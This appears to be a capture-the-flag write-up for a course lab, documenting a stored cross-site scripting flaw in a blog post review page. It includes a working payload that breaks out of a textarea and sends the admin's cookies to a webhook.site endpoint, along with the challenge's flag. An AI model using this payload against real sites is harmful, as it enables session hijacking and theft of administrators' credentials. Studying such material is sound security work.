# Challenge `Go on and censor my posts`

* **Flag:** `SSof{I_do_not_get_this_Too_many_weird_characters_Automatic_reject}`
* **Vulnerability:** Stored Cross-Site Scripting (XSS) via blog post review functionality
* **Where:** Blog post content field in the intermediate post-review page
* **Impact:** Allows an attacker to execute arbitrary JavaScript in the administrator’s browser and steal session cookies

---

## Steps to reproduce

1. Access the blog post submission feature from the main application.

2. Fill the title and content fields with dummy values and submit the form.

3. The application redirects to an intermediate review page, where:

   * The title is no longer editable
   * The content is still editable
   * Two buttons are available:

     * `Update post`
     * `Update post and send it for admin review`

4. In the content field of this intermediate page, inject the following payload:

```html
</textarea><script>var xhr = new XMLHttpRequest(); xhr.open( "GET", "https://webhook.site/0237655b-876d-49dc-b95f-9e890f48aa14?c=" + encodeURIComponent(document.cookie), true ); xhr.send();</script>
```

This way the the textarea is closed and the script tag is injected.

5. Click “Update post and send it for admin review”.

6. The application stores the malicious blog post and automatically sends it to the administrator for review.

7. When the admin opens the post for moderation, the injected JavaScript executes in the admin’s browser context.

8. The script uses `XMLHttpRequest` to send the admin’s cookies to my Webhook endpoint.

9. Inspect the Webhook logs and retrieve the leaked admin cookie, which contains the flag:

```
SSof{I_do_not_get_this_Too_many_weird_characters_Automatic_reject}
```